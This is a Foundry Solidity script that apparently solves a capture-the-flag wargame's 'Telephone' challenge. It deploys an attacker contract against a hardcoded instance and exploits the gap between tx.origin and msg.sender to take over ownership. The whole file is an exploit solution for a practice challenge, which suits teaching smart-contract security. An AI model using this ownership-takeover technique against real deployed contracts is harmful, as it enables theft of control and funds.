// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/04-Telephone/TelephoneAttacker.sol";

/**
 * @title Challenge 04 Solution Script
 * @notice Deploy TelephoneAttacker to exploit tx.origin != msg.sender
 */
contract TelephoneSolution is Script {
    address constant INSTANCE = 0xc927513693b2007B789a3b1686954086EBE3f12D;

    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address player = vm.addr(deployerPrivateKey);

        vm.startBroadcast(deployerPrivateKey);

        // Deploy attacker and call changeOwner through it
        // This makes tx.origin = player, msg.sender = attacker contract
        TelephoneAttacker attacker = new TelephoneAttacker(INSTANCE);
        attacker.attack(player);
        console.log("Deployed TelephoneAttacker and changed owner to:", player);

        vm.stopBroadcast();

        console.log("Challenge 04 completed!");
    }
}
